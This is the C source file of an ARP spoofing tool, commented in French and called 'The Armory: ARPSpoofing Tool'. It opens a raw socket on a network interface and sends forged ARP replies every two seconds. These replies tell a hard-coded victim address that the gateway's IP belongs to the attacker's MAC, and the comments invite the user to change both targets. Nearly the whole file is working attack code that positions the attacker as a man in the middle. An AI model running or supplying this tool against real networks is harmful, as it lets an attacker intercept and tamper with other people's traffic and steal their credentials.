#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <signal.h>

#include "../include/network.h"
#include "../include/protocols.h"

volatile int keep_running = 1;

void handle_signal(int signal) {
    if (signal == SIGINT) {
        printf("\nArrêt du programme détecté. Nettoyage...\n");
        keep_running = 0;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <interface_reseau>\n", argv[0]);
        fprintf(stderr, "Exemple: sudo ./arpspoof eth0\n");
        return EXIT_FAILURE;
    }

    char *interface_name = argv[1];
    int raw_socket;

    signal(SIGINT, handle_signal);

    printf("[*] Démarrage de The Armory: ARPSpoofing Tool\n");

    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (raw_socket < 0) {
        perror("[-] Erreur lors de l'ouverture du socket (Etes-vous root ?)");
        return EXIT_FAILURE;
    }
    printf("[+] Raw Socket ouvert avec succès sur le descripteur %d\n", raw_socket);

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);

    if (ioctl(raw_socket, SIOCGIFINDEX, &ifr) < 0) {
        perror("[-] Erreur: Impossible de trouver l'interface spécifiée");
        close(raw_socket);
        return EXIT_FAILURE;
    }
    
    int if_index = ifr.ifr_ifindex;
    printf("[+] Interface '%s' trouvée à l'index: %d\n", interface_name, if_index);

    // --- Configuration de l'attaque (Valeurs en dur pour l'exemple) ---
    uint8_t my_mac[6];
    if (get_local_mac(raw_socket, interface_name, my_mac) < 0) {
        fprintf(stderr, "[-] Impossible de récupérer la MAC locale.\n");
        close(raw_socket);
        return EXIT_FAILURE;
    }
    printf("[+] MAC Locale: %02x:%02x:%02x:%02x:%02x:%02x\n",
           my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);

    // Cible (Victime) - À modifier selon vos besoins
    char *target_ip = "192.168.1.10"; 
    uint8_t target_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; // Broadcast par défaut

    // IP à usurper (ex: la passerelle) - À modifier selon vos besoins
    char *spoof_ip = "192.168.1.1"; 

    // Préparation de l'adresse de destination pour sendto
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = if_index;
    socket_address.sll_hatype = ARPHRD_ETHER;
    socket_address.sll_pkttype = PACKET_BROADCAST; 
    socket_address.sll_halen = 6;
    memcpy(socket_address.sll_addr, target_mac, 6);

    printf("[*] Début de la boucle d'injection (Appuyez sur Ctrl+C pour arrêter)...\n");
    
    unsigned char buffer[1500]; 

    while (keep_running) {
        // Construction du paquet ARP (Réponse falsifiée)
        // On dit à target_ip que spoof_ip a pour MAC my_mac
        forge_arp_packet(buffer, my_mac, spoof_ip, target_mac, target_ip, ARP_REPLY);

        // Envoi du paquet
        ssize_t sent = sendto(raw_socket, buffer, sizeof(struct ethernet_header) + sizeof(struct arp_header), 
                              0, (struct sockaddr*)&socket_address, sizeof(socket_address));

        if (sent < 0) {
            perror("[-] Erreur lors de l'envoi du paquet");
        } else {
            printf("[+] Paquet ARP spoofé envoyé vers %s : %s est à %02x:%02x:%02x:%02x:%02x:%02x\n", 
                   target_ip, spoof_ip, my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
        }
        
        sleep(2);
    }

    printf("[*] Fermeture du socket.\n");
    close(raw_socket);
    printf("[*] Fin du programme.\n");

    return EXIT_SUCCESS;
}
